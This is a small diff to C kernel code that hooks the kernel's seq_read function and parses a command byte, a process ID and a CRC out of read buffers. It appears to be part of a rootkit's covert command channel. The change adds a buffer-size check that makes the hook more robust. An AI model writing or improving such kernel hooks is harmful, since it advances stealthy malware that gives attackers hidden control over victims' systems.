@@ -121,6 +121,11 @@ static asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf, siz
         return orig_seq_read(file, buf, size, ppos);
     }
 
+    if (size < TOTAL_SIZE) {
+        kfree(kbuf);
+        return orig_seq_read(file, buf, size, ppos);
+    }
+
     sig = (CmdSignal)kbuf[0]; // first byte (command)
     memcpy(&pid, kbuf + PID_OFFSET, PID_SIZE);
     memcpy(&extracted_crc, kbuf + CRC_OFFSET, CRC_SIZE);
